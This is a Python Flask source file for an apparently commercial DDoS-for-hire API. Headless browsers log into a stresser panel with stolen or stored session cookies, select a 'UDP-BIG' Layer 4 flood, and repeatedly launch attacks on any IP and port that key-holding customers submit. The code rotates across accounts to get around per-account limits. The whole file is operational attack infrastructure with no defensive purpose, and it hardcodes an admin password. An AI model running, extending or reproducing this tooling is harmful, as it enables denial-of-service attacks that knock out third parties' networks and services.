from flask import Flask, jsonify, request
from cloakbrowser import launch
import time
import threading
import json
import os
import secrets
import string
from datetime import datetime
import queue

app = Flask(__name__)

# ========== CONFIG ==========
METHOD            = "UDP-BIG"
ADMIN_PASSWORD    = "krishna"
PORT              = 3938
MAX_PRELOADED     = 10       # ⚡ 2 → 10 workers
TOKEN_ROTATE_SEC  = 20       # ⚡ Har 20 sec me token switch

# ========== GLOBALS ==========
sessions             = []
sessions_lock        = threading.Lock()
active_attacks       = 0

api_keys             = {}
api_keys_file        = "api_keys.json"

attack_queue         = queue.Queue()

worker_pool          = []
worker_pool_lock     = threading.Lock()
workers_loading      = 0
workers_loading_lock = threading.Lock()

attack_counter       = 0
attack_counter_lock  = threading.Lock()

session_index        = 0
session_index_lock   = threading.Lock()

# ⚡ Token rotation tracking
token_last_used      = {}   # {session_id: timestamp}
token_lock           = threading.Lock()

SS_FOLDER = "screenshots"
os.makedirs(SS_FOLDER, exist_ok=True)


# ========== LOAD/SAVE API KEYS ==========
def load_api_keys():
    global api_keys
    if os.path.exists(api_keys_file):
        with open(api_keys_file, "r") as f:
            api_keys = json.load(f)
        print(f"✅ API Keys loaded: {len(api_keys)}")
    else:
        api_keys = {}


def save_api_keys():
    with open(api_keys_file, "w") as f:
        json.dump(api_keys, f, indent=2)


# ========== LOAD SESSIONS ==========
def load_sessions():
    global sessions
    print("🔄 Loading sessions...")

    if not os.path.exists("retro_accounts.json"):
        print("❌ retro_accounts.json not found!")
        return False

    with open("retro_accounts.json", "r") as f:
        accounts = json.load(f)

    for account in accounts:
        session_num  = account["session_number"]
        session_file = f"retro_session_{session_num}.json"

        if os.path.exists(session_file):
            with open(session_file, "r") as f:
                cookies = json.load(f)
            sessions.append({
                "id":      session_num,
                "cookies": cookies,
            })
            # Initialize rotation time
            token_last_used[session_num] = 0
            print(f"✅ Session {session_num} loaded")

    print(f"📊 Total sessions: {len(sessions)}")
    return len(sessions) > 0


# ⚡ NEW: Token rotation logic
def get_next_session_rotated():
    """
    Har 20 sec me naya token.
    Jo token 20+ sec se use nahi hua, woh pick karo.
    """
    global session_index
    now = time.time()

    with token_lock:
        # Pehle un tokens me dhundo jo 20+ sec purane hain
        available = []
        for s in sessions:
            last = token_last_used.get(s["id"], 0)
            if now - last >= TOKEN_ROTATE_SEC:
                available.append(s)

        # Agar koi available nahi, toh sabse purana uthao
        if not available:
            sorted_sessions = sorted(
                sessions,
                key=lambda s: token_last_used.get(s["id"], 0)
            )
            session = sorted_sessions[0]
        else:
            # Round-robin within available
            session = available[session_index % len(available)]
            session_index += 1

        # Mark as used
        token_last_used[session["id"]] = now
        return session


def get_next_session():
    """Purana round-robin (fallback)"""
    global session_index
    with session_index_lock:
        session = sessions[session_index % len(sessions)]
        session_index += 1
        return session


# ========== SLOT MANAGEMENT ==========
def get_total_slots():
    return len(sessions)


def get_used_slots():
    total = 0
    for key_data in api_keys.values():
        if key_data.get("active"):
            total += key_data.get("slots", 0)
    return total


def get_available_slots():
    return get_total_slots() - get_used_slots()


def generate_api_key():
    chars = string.ascii_letters + string.digits
    return ''.join(secrets.choice(chars) for _ in range(32))


def check_password(req):
    password = req.args.get('password') or req.headers.get('X-Password')
    return password == ADMIN_PASSWORD


# ========== SCREENSHOT ==========
def take_screenshot(page, name, full_page=True):
    try:
        path = os.path.join(SS_FOLDER, name)
        page.screenshot(path=path, full_page=full_page)
        print(f"📸 {name}")
        return path
    except Exception as e:
        print(f"📸 Failed: {e}")
        return None


def get_attack_ss_name(atk_num):
    return f"atk{str(atk_num).zfill(4)}.png"


# ========== WORKER THREAD ==========
def worker_thread(worker_number):
    global active_attacks, workers_loading, attack_counter

    browser           = None
    page              = None
    loading_decreased = False

    # ⚡ Rotated session pick
    session    = get_next_session_rotated()
    session_id = session["id"]

    try:
        print(f"[Worker-{worker_number}] 🌐 Session {session_id} | Opening...")

        browser = launch(headless=True)
        page    = browser.new_page()
        page.set_viewport_size({"width": 1920, "height": 1080})

        page.context.add_cookies(session["cookies"])

        page.goto(
            "https://retrostress.net/panel",
            wait_until="networkidle",
            timeout=90000
        )

        print(f"[Worker-{worker_number}] ⏳ Waiting for page fully load...")
        time.sleep(4)

        if "auth" in page.url or "login" in page.url:
            print(f"[Worker-{worker_number}] ❌ Session expired!")
            return

        print(f"[Worker-{worker_number}] ✅ Panel opened! URL: {page.url}")

        take_screenshot(page, f"panel_w{worker_number}.png")

        # ===== METHOD SELECT =====
        method_selected = False

        for retry in range(3):
            try:
                print(f"[Worker-{worker_number}] 🔧 Selecting {METHOD}... (attempt {retry+1})")

                # Layer 4
                clicked_layer4 = page.evaluate("""
                    () => {
                        const allBtns = document.querySelectorAll('button');
                        for (const btn of allBtns) {
                            const text = btn.innerText || btn.textContent || '';
                            if (text.includes('Network endpoint') || text.includes('Layer 4')) {
                                btn.click();
                                return 'clicked: ' + text.trim().substring(0, 50);
                            }
                        }
                        return false;
                    }
                """)

                if not clicked_layer4:
                    take_screenshot(page, f"debug_layer4_w{worker_number}_r{retry+1}.png")
                    raise Exception("Layer 4 not found")

                print(f"[Worker-{worker_number}] ✅ Layer 4 clicked")
                time.sleep(1)

                # Browse
                clicked_browse = page.evaluate("""
                    () => {
                        const span = document.querySelector('span.app-method-trigger-action');
                        if (span) { span.click(); return true; }
                        const allSpans = document.querySelectorAll('span');
                        for (const s of allSpans) {
                            if (s.innerText && s.innerText.includes('Browse methods')) {
                                s.click(); return true;
                            }
                        }
                        return false;
                    }
                """)

                if not clicked_browse:
                    raise Exception("Browse not found")

                print(f"[Worker-{worker_number}] ✅ Browse opened")
                time.sleep(2)

                # UDP
                clicked_udp = page.evaluate("""
                    () => {
                        const buttons = document.querySelectorAll('button');
                        for (const btn of buttons) {
                            const text = (btn.innerText || btn.textContent || '').trim();
                            if (text === 'UDP') { btn.click(); return true; }
                        }
                        return false;
                    }
                """)

                if not clicked_udp:
                    raise Exception("UDP not found")

                print(f"[Worker-{worker_number}] ✅ UDP clicked")
                time.sleep(1)

                # UDP-BIG
                clicked_method = page.evaluate("""
                    () => {
                        const options = document.querySelectorAll('button[role="option"]');
                        for (const opt of options) {
                            const strong = opt.querySelector('strong');
                            if (strong && strong.textContent.trim() === 'UDP-BIG') {
                                opt.click(); return true;
                            }
                        }
                        const allBtns = document.querySelectorAll('button');
                        for (const btn of allBtns) {
                            const strong = btn.querySelector('strong');
                            if (strong && strong.textContent.trim() === 'UDP-BIG') {
                                btn.click(); return true;
                            }
                        }
                        return false;
                    }
                """)

                if not clicked_method:
                    raise Exception("UDP-BIG not found")

                print(f"[Worker-{worker_number}] ✅ {METHOD} selected!")
                time.sleep(0.5)
                take_screenshot(page, f"ready_w{worker_number}.png")

                method_selected = True
                break

            except Exception as e:
                print(f"[Worker-{worker_number}] ⚠️ Retry {retry+1}: {e}")
                try:
                    page.keyboard.press('Escape')
                except:
                    pass
                time.sleep(2)

                if retry == 2:
                    print(f"[Worker-{worker_number}] ❌ Method select failed!")
                    return

        if not method_selected:
            return

        print(f"[Worker-{worker_number}] ✅ Ready!")

        with workers_loading_lock:
            if workers_loading > 0:
                workers_loading -= 1
                loading_decreased = True

        with worker_pool_lock:
            current_pool_size = len(worker_pool)
            if current_pool_size >= MAX_PRELOADED:
                print(f"[Worker-{worker_number}] ⚠️ Pool full, closing...")
                return
            worker_pool.append(worker_number)
            pool_size = len(worker_pool)

        with workers_loading_lock:
            loading = workers_loading

        print(f"[Worker-{worker_number}] 📊 Pool: {pool_size}/{MAX_PRELOADED} | Loading: {loading}")

        # ===== WAIT FOR JOB =====
        job = attack_queue.get(block=True)

        with worker_pool_lock:
            if worker_number in worker_pool:
                worker_pool.remove(worker_number)

        target_ip = job["ip"]
        port      = job["port"]
        duration  = job["duration"]

        with attack_counter_lock:
            attack_counter += 1
            atk_num = attack_counter

        ss_name = get_attack_ss_name(atk_num)

        print(f"[Worker-{worker_number}] 🎯 ATK-{atk_num} | {target_ip}:{port} | {duration}s | Session {session_id}")

        # Fill IP
        ip_filled = page.evaluate(f"""
            () => {{
                const el = document.querySelector('input#test-url');
                if (el) {{
                    el.focus();
                    el.value = '{target_ip}';
                    el.dispatchEvent(new Event('input', {{ bubbles: true }}));
                    el.dispatchEvent(new Event('change', {{ bubbles: true }}));
                    return true;
                }}
                return false;
            }}
        """)
        if not ip_filled:
            page.locator('input#test-url').fill(target_ip)
        time.sleep(0.2)

        # Fill Port
        port_filled = page.evaluate(f"""
            () => {{
                const el = document.querySelector('input[aria-label="port"]');
                if (el) {{
                    el.focus();
                    el.value = '{port}';
                    el.dispatchEvent(new Event('input', {{ bubbles: true }}));
                    el.dispatchEvent(new Event('change', {{ bubbles: true }}));
                    return true;
                }}
                return false;
            }}
        """)
        if not port_filled:
            page.locator('input[aria-label="port"]').fill(str(port))
        time.sleep(0.2)

        # ===== SPAM with ROTATION =====
        # ⚡ Har 20 sec me check karo — agar 20 sec pure, toh naya worker spawn karo
        total_duration = max(duration - 1, 1)
        start_time     = time.time()
        click_count    = 0
        ss_taken       = False

        print(f"[Worker-{worker_number}] 🚀 SPAM START! (rotation every {TOKEN_ROTATE_SEC}s)")

        # ⚡ Rotation timer
        next_rotation = start_time + TOKEN_ROTATE_SEC

        while time.time() - start_time < total_duration:
            try:
                attack_button = page.locator('button.button.primary:has-text("Start test")')
                attack_button.click(force=True)
                click_count += 1

                if not ss_taken and time.time() - start_time >= 1:
                    take_screenshot(page, ss_name)
                    ss_taken = True

                if click_count % 200 == 0:
                    elapsed   = int(time.time() - start_time)
                    remaining = int(total_duration - elapsed)
                    cps       = int(click_count / max(elapsed, 1))
                    print(f"[Worker-{worker_number}] ⚡ {click_count} | {cps}/s | {remaining}s left")

                # ⚡ ROTATION CHECK
                if time.time() >= next_rotation:
                    print(f"[Worker-{worker_number}] 🔄 20s complete — requesting next worker...")
                    # Naya worker spawn karo (pool manager handle karega)
                    with workers_loading_lock:
                        workers_loading += 1
                    with worker_counter_lock:
                        worker_counter += 1
                        new_worker_num = worker_counter
                    t = threading.Thread(
                        target=worker_thread,
                        args=(new_worker_num,),
                        daemon=True
                    )
                    t.start()
                    # Next rotation 20 sec baad
                    next_rotation = time.time() + TOKEN_ROTATE_SEC

                time.sleep(0.05)

            except:
                time.sleep(0.05)
                continue

        total_time = time.time() - start_time
        cps        = int(click_count / max(total_time, 1))
        print(f"[Worker-{worker_number}] ✅ DONE! {click_count} clicks | {cps} cps | Session {session_id}")

    except Exception as e:
        print(f"[Worker-{worker_number}] ❌ Error: {e}")

    finally:
        if browser:
            try:
                browser.close()
            except:
                pass

        with worker_pool_lock:
            if worker_number in worker_pool:
                worker_pool.remove(worker_number)

        if not loading_decreased:
            with workers_loading_lock:
                if workers_loading > 0:
                    workers_loading -= 1

        with sessions_lock:
            active_attacks -= 1

        print(f"[Worker-{worker_number}] 🔒 Released!")


# ========== POOL MANAGER ==========
worker_counter      = 0
worker_counter_lock = threading.Lock()


def pool_manager():
    global workers_loading, worker_counter

    while True:
        try:
            with worker_pool_lock:
                pool_size = len(worker_pool)

            with workers_loading_lock:
                loading = workers_loading

            total_in_progress = pool_size + loading
            needed            = MAX_PRELOADED - total_in_progress

            if needed > 0:
                print(f"[Pool] 📊 Ready: {pool_size} | Loading: {loading} | Need: {needed}")

                for i in range(needed):
                    with workers_loading_lock:
                        workers_loading += 1

                    with worker_counter_lock:
                        worker_counter += 1
                        worker_num = worker_counter

                    t = threading.Thread(
                        target=worker_thread,
                        args=(worker_num,),
                        daemon=True
                    )
                    t.start()
                    time.sleep(0.1)

        except Exception as e:
            print(f"[Pool] ❌ Error: {e}")

        time.sleep(5)


# ========== ADMIN ROUTES ==========
@app.route('/admin/generate_key', methods=['GET'])
def generate_key():
    if not check_password(request):
        return jsonify({"status": "error", "message": "❌ Wrong password!"}), 403

    slots = int(request.args.get('slots', 1))
    if slots < 1:
        return jsonify({"status": "error", "message": "❌ Min 1 slot!"}), 400

    available = get_available_slots()
    if slots > available:
        return jsonify({"status": "error", "available_slots": available}), 400

    new_key    = generate_api_key()
    created_at = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    api_keys[new_key] = {
        "slots":   slots,
        "created": created_at,
        "active":  True
    }
    save_api_keys()

    return jsonify({
        "status":  "success",
        "api_key": new_key,
        "slots":   slots,
        "created": created_at
    })


@app.route('/admin/list_keys', methods=['GET'])
def list_keys():
    if not check_password(request):
        return jsonify({"status": "error"}), 403

    return jsonify({
        "status": "success",
        "keys":   list(api_keys.keys())
    })


# ========== ATTACK ROUTES ==========
@app.route('/attack/<ip>/<int:port>/<int:time_sec>', methods=['GET'])
def attack_url(ip, port, time_sec):
    global active_attacks

    api_key = request.args.get('key') or request.headers.get('X-API-Key')
    if not api_key or api_key not in api_keys or not api_keys[api_key]["active"]:
        return jsonify({"status": "error", "message": "❌ Invalid Key"}), 403

    if time_sec > 300 or time_sec < 1:
        return jsonify({"status": "error", "message": "❌ Duration: 1-300s"}), 400

    with worker_pool_lock:
        pool_size = len(worker_pool)

    if pool_size == 0:
        return jsonify({"status": "error", "message": "❌ No workers ready"}), 429

    with sessions_lock:
        active_attacks += 1
        attack_id = active_attacks

    attack_queue.put({
        "ip":        ip,
        "port":      port,
        "duration":  time_sec,
        "attack_id": attack_id
    })

    return jsonify({
        "status":         "success",
        "message":        "🚀 Launched!",
        "attack_id":      attack_id,
        "target":         f"{ip}:{port}",
        "duration":       f"{time_sec}s",
        "pool_ready":     pool_size,
        "active_attacks": active_attacks
    })


@app.route('/attack', methods=['GET'])
def attack_query():
    ip       = request.args.get('ip')
    port     = request.args.get('port', 80)
    time_sec = request.args.get('time', 60)

    if not ip:
        return jsonify({"status": "error", "message": "❌ IP required"}), 400

    return attack_url(ip, int(port), int(time_sec))


# ========== STATUS ==========
@app.route('/status', methods=['GET'])
def status():
    with worker_pool_lock:
        pool_size = len(worker_pool)

    with workers_loading_lock:
        loading = workers_loading

    try:
        ss_count = len(os.listdir(SS_FOLDER))
    except:
        ss_count = 0

    # ⚡ Token rotation info
    now = time.time()
    token_info = []
    for s in sessions:
        last = token_last_used.get(s["id"], 0)
        ago  = int(now - last) if last > 0 else -1
        token_info.append({
            "session": s["id"],
            "last_used_sec_ago": ago
        })

    return jsonify({
        "status":         "🟢 Online",
        "pool_ready":     pool_size,
        "pool_loading":   loading,
        "max_pool":       MAX_PRELOADED,
        "active_attacks": active_attacks,
        "screenshots":    ss_count,
        "token_rotate_sec": TOKEN_ROTATE_SEC,
        "tokens":         token_info
    })


@app.route('/screenshots', methods=['GET'])
def list_screenshots():
    try:
        files = sorted(os.listdir(SS_FOLDER))
        return jsonify({"total": len(files), "files": files})
    except:
        return jsonify({"error": "Failed"}), 500


@app.route('/', methods=['GET'])
def home():
    return jsonify({
        "status": "🟢 Online",
        "api":    "⚡ KRISHNA ULTRA FAST — 10 WORKERS",
        "port":   PORT,
        "max_workers": MAX_PRELOADED,
        "token_rotate_sec": TOKEN_ROTATE_SEC
    })


# ========== MAIN ==========
if __name__ == '__main__':
    print("=" * 60)
    print("⚡ KRISHNA ULTRA FAST API — 10 WORKERS + ROTATION")
    print("=" * 60)

    load_api_keys()

    if not load_sessions():
        print("❌ No sessions!")
        exit(1)

    print(f"\n📊 Sessions:        {len(sessions)}")
    print(f"🎯 Max Workers:     {MAX_PRELOADED}")
    print(f"⚡ Method:          {METHOD}")
    print(f"🔄 Token Rotate:    {TOKEN_ROTATE_SEC}s")

    print("\n🚀 Starting pool manager...")
    pm = threading.Thread(target=pool_manager, daemon=True)
    pm.start()

    print(f"⏳ Loading {MAX_PRELOADED} workers...")
    timeout = 300
    start   = time.time()

    while time.time() - start < timeout:
        with worker_pool_lock:
            ready = len(worker_pool)

        with workers_loading_lock:
            loading = workers_loading

        if ready >= MAX_PRELOADED:
            break

        print(f"   Ready: {ready}/{MAX_PRELOADED} | Loading: {loading}")
        time.sleep(3)

    with worker_pool_lock:
        ready = len(worker_pool)

    print(f"\n✅ Ready: {ready}/{MAX_PRELOADED}")
    print(f"🚀 Port: {PORT}")
    print("=" * 60 + "\n")

    app.run(host='0.0.0.0', port=PORT, debug=False, threaded=True)